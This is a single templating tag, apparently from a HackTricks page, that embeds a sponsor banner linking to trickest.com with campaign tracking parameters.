{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
